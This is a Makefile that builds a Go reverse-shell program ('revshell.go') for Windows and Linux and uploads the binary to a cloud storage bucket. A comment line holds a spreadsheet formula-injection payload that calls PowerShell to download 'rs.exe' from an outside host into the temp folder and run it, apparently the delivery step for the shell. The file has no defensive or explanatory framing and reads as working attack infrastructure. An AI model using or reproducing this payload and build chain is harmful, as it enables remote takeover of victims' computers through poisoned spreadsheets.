include .env
export

## =cmd|' /C powershell Invoke-WebRequest "http://somehost/rs.exe" -OutFile "$env:Temp\rs.exe"; Start-Process "$env:Temp\rs.exe"'!A1

.PHONY: build

release: build
	gsutil cp $(EXE) $(RS_GCS_URL)

build:
	GOOS=windows GOARCH=amd64 go build -o $(EXE) revshell.go

build-powershell:
	GOOS=windows GOARCH=amd64 go build -o rs-ps.exe revshell.go

build-native:
	go build -o revshell revshell.go

build-linux:
	GOOS=linux go build -o revshell-linux revshell.go
